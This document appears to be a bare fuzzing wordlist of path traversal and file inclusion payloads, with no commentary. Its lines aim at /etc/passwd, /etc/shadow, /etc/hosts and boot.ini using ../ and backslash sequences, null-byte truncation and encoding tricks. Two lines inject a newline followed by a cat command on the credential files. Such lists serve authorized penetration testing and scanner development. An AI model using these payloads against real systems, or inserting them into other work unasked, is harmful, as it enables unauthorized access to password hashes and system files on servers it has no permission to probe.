../../../../../../../../../../../../etc/hosts%00
../../../../../../../../../../../../etc/hosts
../../boot.ini
/../../../../../../../../%2A
../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../etc/passwd^^
/../../../../../../../../../../etc/shadow^^
/../../../../../../../../../../etc/passwd
/../../../../../../../../../../etc/shadow
/./././././././././././etc/passwd
/./././././././././././etc/shadow
\..\..\..\..\..\..\..\..\..\..\etc\passwd
\..\..\..\..\..\..\..\..\..\..\etc\shadow
..\..\..\..\..\..\..\..\..\..\etc\passwd
..\..\..\..\..\..\..\..\..\..\etc\shadow
/..\../..\../..\../..\../..\../..\../etc/passwd
/..\../..\../..\../..\../..\../..\../etc/shadow
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
..\..\..\..\..\..\..\..\..\..\etc\passwd%00
..\..\..\..\..\..\..\..\..\..\etc\shadow%00
%0a/bin/cat%20/etc/passwd
%0a/bin/cat%20/etc/shadow
%00/etc/passwd%00
%00/etc/shadow%00
%00../../../../../../etc/passwd
%00../../../../../../etc/shadow